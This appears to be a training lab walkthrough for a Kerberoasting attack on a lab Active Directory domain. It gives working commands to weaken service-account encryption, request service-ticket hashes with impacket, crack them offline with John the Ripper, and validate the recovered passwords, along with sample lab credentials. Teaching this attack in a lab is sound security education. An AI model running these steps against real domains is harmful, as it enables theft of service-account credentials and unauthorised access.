# Lab 1: Kerberoasting

**Lab Description:** In this lab you will perform a **Kerberoasting** attack against the
`corp.local` domain. Starting from a single low-privileged domain user, you will request
Kerberos service tickets for accounts that have Service Principal Names (SPNs), then crack
those tickets offline to recover the service accounts' plaintext passwords.

**Estimated Duration:** **15 Minutes**

**Learning Objectives:** By the end of this lab, you will be able to:

- Validate domain credentials against a Domain Controller
- Request Kerberos TGS tickets for all SPN-enabled accounts
- Crack the extracted ticket hashes offline with a wordlist
- Confirm the recovered service-account credentials are valid

**Environment / starting position:**

| Item | Value |
|---|---|
| Domain | `corp.local` (DC: `dc1` @ 10.0.1.10) |
| Attacker host | `kali` (tools pre-installed) |
| Starting credential (assume-breach, low-priv user) | `amiller` / `Summer2024` |

> The steps below are in order. A **▶ host** banner tells you which machine to run each step on.

---

## ▶ DC1 — environment prep

1. Switch to the **DC1** console and open an elevated **PowerShell** as `CORP\azureuser`.

1. Ensure the Kerberoastable service accounts use **RC4** encryption, so their tickets come
   back in the classic crackable format:

    ```powershell
    'svc.sql','svc.web','svc.mssql','svc.sccm','svc.iis' | ForEach-Object {
        Set-ADUser -Identity $_ -Replace @{ 'msDS-SupportedEncryptionTypes' = 4 }
    }
    ```

---

## ▶ Kali — the attack

1. Switch to the **Kali** host (SSH in using the details from the **Environment** tab) and
   confirm you can reach the domain.

    ```bash
    nslookup dc1.corp.local
    ```

    **Expected Output:** `dc1.corp.local` resolves to **10.0.1.10**.

1. Validate the low-privileged domain credentials against the Domain Controller.

    ```bash
    netexec smb 10.0.1.10 -u amiller -p 'Summer2024'
    ```

    **Expected Output:** a `[+] corp.local\amiller:Summer2024` line confirms the credentials.

1. Request Kerberos service tickets (TGS) for **every account that has an SPN**. Any
   authenticated domain user can do this — that's what makes Kerberoasting powerful.

    ```bash
    impacket-GetUserSPNs corp.local/amiller:'Summer2024' -dc-ip 10.0.1.10 -request -outputfile /tmp/kerberoast.txt
    ```

    **Expected Output:** a table of SPN-enabled service accounts (`svc.web`, `svc.mssql`,
    `svc.sccm`, `svc.sql`, `svc.iis`); the ticket hashes are saved to `/tmp/kerberoast.txt`.

1. Prepare the **rockyou** wordlist and crack the tickets offline with **John the Ripper**
   (CPU-based, auto-detects the ticket type — no GPU needed).

    ```bash
    sudo apt-get install -y wordlists
    sudo gunzip -kf /usr/share/wordlists/rockyou.txt.gz
    john /tmp/kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
    john --show /tmp/kerberoast.txt
    ```

    **Expected Output:** one or more service accounts crack — e.g. `svc.web` → **`Password1`**.

1. Confirm the recovered service-account credential is valid on the domain.

    ```bash
    netexec smb 10.0.1.20 -u svc.web -p 'Password1'
    ```

    **Expected Output:** `[+] corp.local\svc.web:Password1`.

**Lab 1 Recap:** You validated a low-privileged credential, requested TGS tickets for all
SPN-enabled service accounts, cracked them offline with John, and confirmed a recovered
password works — proving the domain's weak, Kerberoastable service accounts are exploitable.

## You have successfully completed Lab 1.

Now, click on **Next** from the lower right corner to move on to the next lab.
